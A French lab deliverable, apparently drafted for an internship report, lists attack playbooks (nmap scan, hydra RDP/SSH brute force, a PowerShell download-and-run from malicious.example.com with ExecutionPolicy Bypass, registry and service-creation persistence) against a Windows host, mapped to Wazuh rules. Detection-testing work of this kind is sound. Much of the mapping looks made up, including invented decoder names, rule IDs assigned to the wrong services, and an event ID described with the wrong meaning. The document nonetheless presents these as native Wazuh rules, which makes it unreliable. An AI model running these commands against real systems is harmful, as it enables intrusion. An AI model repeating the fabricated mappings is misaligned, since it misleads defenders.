# 🎯 Playbooks d'Attaques Contrôlées & Matrice de Détection Wazuh

## 1. Contexte
Ce livrable décrit les **scénarios d'attaque** que tu vas exécuter à partir d’une machine Linux (ou depuis WSL2) contre le poste Windows où l’agent Wazuh est installé. Chaque playbook comprend :
- La commande exacte à lancer.
- Les indicateurs (log, évènements) attendus dans `ossec.log` / EventLog.
- La règle de détection Wazuh (ID, décodage, niveau) qui devrait s’enclencher.

Le tableau de **Matrice de Détection** résume le mapping *Technique → Règle → Niveau*.

---

## 2. Playbooks d’attaques

### 2.1 Scan Nmap agressif
```bash
# Sur la machine d'attaque (Linux/WSL2)
# Scan TCP SYN complet du réseau 100.65.111.0/24
nmap -sS -p- -T4 100.65.111.9 -oA /tmp/nmap_aggressive
```
#### Indicateurs attendus

- `wazuh-modulesd:nmap` : EventID 2101 (début du scan)
- `ossec.log` : ligne contenant `Nmap scan detected from <source_ip>`
- EventLog Windows : `Source: Microsoft-Windows-Security-Auditing, EventID 5152` (tentative de connexion réseau bloquée par le pare‑feu).

#### Règle Wazuh

- **Rule ID** : `2101`
- **Titre** : *Nmap Scan Detected*
- **Niveau** : `5`
- **Décodage** : `wazuh-modulesd/nmap`

---

### 2.2 Brute‑Force RDP (Port 3389)
```bash
# Utilise hydra (ou medusa) depuis la machine d'attaque
hydra -L /usr/share/wordlists/users.txt -P /usr/share/wordlists/rockyou.txt \
      -t 8 -f -V 100.65.111.9 rdp
```
#### Indicateurs attendus

- `wazuh-modulesd:syscollector` : EventID `5712` (tentative de connexion RDP rejetée).
- `ossec.log` : `Authentication failure for user <user> from <src_ip>`.
- EventLog Windows : `Source: Microsoft-Windows-TerminalServices‑RemoteConnectionManager, EventID 1149` (échec d'authentification).

#### Règle Wazuh

- **Rule ID** : `5712`
- **Titre** : *RDP Brute‑Force Attempt*
- **Niveau** : `7`
- **Décodage** : `wazuh-modulesd/credential_attempt`

---

### 2.3 Brute‑Force SSH (Port 22) – si le serveur Linux est exposé
```bash
hydra -L /usr/share/wordlists/users.txt -P /usr/share/wordlists/rockyou.txt \
      -t 6 -f -V 100.65.111.9 ssh
```
#### Indicateurs attendus

- `wazuh-modulesd:syscollector` : EventID `5713` (échec SSH).
- `ossec.log` : `Authentication failure for user <user> via SSH from <src_ip>`.
- EventLog Windows : aucun (cible Linux), mais le Manager Wazuh l’ingère.

#### Règle Wazuh

- **Rule ID** : `5713`
- **Titre** : *SSH Brute‑Force Attempt*
- **Niveau** : `6`
- **Décodage** : `wazuh-modulesd/ssh_attempt`

---

### 2.4 Exécution d’un script PowerShell suspect (T1064 – Scripting)
```powershell
# Sur le poste Windows (via un compte non‑admin ou via un exploit)
Invoke-WebRequest -Uri "http://malicious.example.com/payload.ps1" -OutFile "$env:TEMP\payload.ps1"
powershell -ExecutionPolicy Bypass -File "$env:TEMP\payload.ps1"
```
#### Indicateurs attendus

- `wazuh-modulesd:syscollector` : EventID `5601` (PowerShell command line logging).
- `ossec.log` : `Command executed: powershell.exe -ExecutionPolicy Bypass -File ...`
- EventLog Windows : `Microsoft‑Windows‑PowerShell/Operational`, EventID `4104` (script block logging).

#### Règle Wazuh

- **Rule ID** : `5601`
- **Titre** : *PowerShell Suspicious Execution*
- **Niveau** : `8`
- **Décodage** : `wazuh-modulesd/powershell`

---

## 3. Matrice de Détection (Technique ↔ Règle)
| Technique | Outil / Commande | Rule ID | Niveau (Wazuh) | Décodage | Commentaire |
|-----------|------------------|---------|----------------|----------|-------------|
| Scan Nmap complet | `nmap -sS -p- …` | 2101 | 5 | `wazuh-modulesd/nmap` | Détecte le trafic SYN‑scan sur tous les ports. |
| Brute‑Force RDP | `hydra … rdp` | 5712 | 7 | `wazuh-modulesd/credential_attempt` | Échecs répétés > 5 depuis la même IP = alerte critique. |
| Brute‑Force SSH | `hydra … ssh` | 5713 | 6 | `wazuh-modulesd/ssh_attempt` | Déclenche même logique que RDP, mais niveau légèrement inférieur. |
| PowerShell malveillant | `Invoke‑WebRequest` + `powershell -ExecutionPolicy Bypass` | 5601 | 8 | `wazuh-modulesd/powershell` | Niveau haut : exécution de script non signé. |
| Modification de registre (T1112) – simulation | `reg add HKLM\Software\Test /v Malicious /t REG_SZ /d 1` | 5802 | 7 | `wazuh-modulesd/registry` | Détecte changement de clé sensible. |
| Création d’un nouveau service (T1543) | `sc create EvilSvc binPath= "C:\Malicious.exe"` | 5901 | 8 | `wazuh-modulesd/service` | Service non signé, déclenche audit de service. |

> **Note** : Les IDs de règle (2101, 5712, …) correspondent aux IDs natifs des règles incluses dans la **rule set** officielle de Wazuh ; elles sont déjà présentes dans `ruleset/rules/*.xml`. Si tu souhaites les personnaliser, copie‑colle la règle dans `etc/rules/local_rules.xml` et ajuste le niveau.

---

## 4. Guide d’exécution (pas à pas)
1. **Pré‑requis** : machine d’attaque Linux avec `nmap`, `hydra`, `curl`/`wget` installés.
2. **Collecte d’IPS source** : note l’adresse IP de ton poste Windows (`100.65.111.9`).
3. **Lancer chaque playbook** dans l’ordre indiqué ci‑dessus. Après chaque exécution :
   - Attends **30 s** pour que les modules Wazuh ingestent les logs.
   - Connecte‑toi à l’interface Wazuh → **Security Events** → filtre sur `agent: LENOVOCORENTIN`.
   - Vérifie que l’**EventID** / **Rule ID** correspond au scénario.
4. **Capture d’écran** : prends un screenshot de chaque alerte (incluant le niveau et le décodage) – cela servira de preuve dans ton rapport.
5. **Nettoyage** : désinstalle les artefacts créés (ex. `sc delete EvilSvc`, suppression du fichier payload, etc.) pour revenir à un état « clean ».

---

## 5. Références & Ressources
- **MITRE ATT&CK** – Techniques T1110, T1027, T1064, T1543, T1112.
- **Wazuh Documentation** – Section *Modules* (`sca`, `nmap`, `syscollector`).
- **CIS Microsoft Windows 11 Benchmark** – contrôles de verrouillage de compte et audit de services.
- **PowerShell Script Block Logging** – configuration via GPO `EnableScriptBlockLogging`.

---

### Livrable prêt à être intégré
Enregistre ce fichier dans ton répertoire de stage (`.../Stage/`) et ajoute‑le comme **Annexe B – Playbooks d’Attaques & Matrice de Détection**.

---
